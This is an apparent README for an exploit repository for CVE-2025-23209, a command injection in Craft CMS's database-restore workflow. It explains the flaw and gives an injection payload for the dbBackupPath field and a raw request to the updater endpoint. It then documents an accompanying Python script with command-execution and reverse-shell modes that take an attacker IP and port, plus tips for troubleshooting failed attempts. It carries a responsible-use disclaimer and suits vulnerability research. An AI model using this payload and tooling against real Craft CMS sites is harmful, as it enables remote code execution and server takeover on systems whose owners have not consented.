# CVE-2025-23209

For authorized security testing and research environments only.

## Vulnerability Summary

`CVE-2025-23209` is a command-injection flaw in Craft CMS' database-restore workflow.
In affected versions, an attacker-controlled backup-path value can move from signed request data into shell command construction without context-safe sanitization.

Affected ranges:

- Craft CMS `>= 4.0.0-RC1` and `< 4.13.8`
- Craft CMS `>= 5.0.0-RC1` and `< 5.5.8`

Fixed in:

- `4.13.8`
- `5.5.8`

## Internal Craft CMS Behavior

This section explains internals only, independent of CTF-specific routes/paths.

### Execution Call Graph (Conceptual)

```text
HTTP POST (signed data + CSRF)
  -> Request validation layer
     -> getValidatedBodyParam('data')
     -> JSON decode
  -> Updater restore action
     -> DB connection restore(filePath)
     -> restore command template expansion
     -> shell/process execution
```

### 1. Request Integrity vs Request Safety

Craft validates request integrity through:

1. CSRF/session checks for POST actions
2. Signed body parameter verification using `CRAFT_SECURITY_KEY`

Conceptual snippet:

```php
$validated = Craft::$app->getRequest()->getValidatedBodyParam('data');
$this->data = Json::decode($validated);
```

This proves payload authenticity relative to the key, but does not guarantee that each field is safe for every later execution context.

### 2. Restore Workflow Boundary

At a high level:

1. Controller receives validated payload
2. `dbBackupPath` is read from payload
3. DB restore API is called with that value

Conceptual shape:

```php
Craft::$app->getDb()->restore($this->data['dbBackupPath']);
```

The risk begins when a data field intended to represent a file path is later embedded into shell command text.

### 3. Token Expansion and Shell Context

For MySQL-backed installs, restore operations rely on command templates with token substitution (for example `{file}`).
If token replacement is performed as plain string substitution without strict command-context escaping, path data can become shell syntax.

### 4. Process Execution Boundary

After expansion, the command string is executed by a process/shell wrapper.
At this point, quoting rules and metacharacters control behavior.
A value treated as "just a path" at application level may be interpreted as executable syntax at shell level.

### 5.Threat Model Gap
   - If `CRAFT_SECURITY_KEY` leakage is possible, signed endpoints must still assume maliciously crafted but valid payloads.

### 6.Command Injection

If `dbBackupPath` = `"; whoami #`

The command becomes:
```bash
mysql --defaults-file=/tmp/xxx dbname < ""; whoami #"
```

This executes as **separate commands**:
1. `mysql ... < ""` (fails)
2. `whoami` (executed command!)
3. `#` (comments out trailing `"`)
### 7.Raw Request 
```http
POST /admin/actions/updater/restore-db HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: CraftSessionId=...

data=<SIGNED_PAYLOAD>&CRAFT_CSRF_TOKEN=<token>
```
## Exploit Preconditions

- Compromised `CRAFT_SECURITY_KEY`
- Access to Craft CMS updater endpoints
- Valid CSRF/session context (or bypass)

## Script Usage

This repository includes:

- `CVE_2025_23209.py`

What it automates:

1. Builds a `dbBackupPath` payload
2. Attempts CSRF/session bootstrap from common CP pages
3. Signs payload in compatible modes
4. Tries common updater endpoint variants
5. Sends request and prints diagnostic hints

### Requirements

- Python 3.9+
- `requests`

Install:

```bash
python3 -m pip install requests
```

### CLI Help

```bash
python3 CVE_2025_23209.py -h
```

### Basic Command Execution

```bash
python3 CVE_2025_23209.py \
  --url http://<target-host> \
  --security-key <CRAFT_SECURITY_KEY> \
  --command "id"
```

### Reverse Shell Mode

```bash
python3 CVE_2025_23209.py \
  --url http://<target-host> \
  --security-key <CRAFT_SECURITY_KEY> \
  --lhost <attacker-ip> \
  --lport 4444
```

### Signature Mode

```bash
--signature-mode auto|hex|raw_b64|blob_b64
```

`auto` is recommended for compatibility checks.

## Interpreting Common Responses

### `400 Unable to verify your data submission.`

Usually means one of:

1. Incorrect `CRAFT_SECURITY_KEY`
2. CSRF/session bootstrap failure
3. Endpoint route mismatch
4. Signature mode mismatch

### `302` Redirect

Usually indicates route/auth/session behavior differences in that deployment.

### `Invalid backup path` style error

Typically indicates patched/hardened path checks are active.

## Responsible Use

Use this information only on systems you own or are explicitly authorized to test.
Do not run exploit code against third-party infrastructure without written permission.

## References

- NVD: <https://nvd.nist.gov/vuln/detail/CVE-2025-23209>
- GHSA advisory: <https://github.com/craftcms/cms/security/advisories/GHSA-x684-96hh-833x>
- Craft CMS patch commit: <https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603>
